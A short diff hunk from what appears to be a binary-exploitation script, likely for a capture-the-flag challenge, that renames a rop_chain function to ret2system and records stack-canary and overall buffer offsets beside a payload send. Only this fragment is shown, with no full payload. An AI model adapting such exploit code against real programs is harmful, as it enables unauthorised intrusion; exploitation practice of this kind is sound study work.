@@ -120,11 +120,11 @@ def shift_stack():
     r.sendline(payload)
     r.recvline()
 
-    rop_chain()
+    ret2system()
 
 #--------------------------#
 
-def rop_chain():
+def ret2system():
     
     # offset from canary: 140
     # overall offset: 156
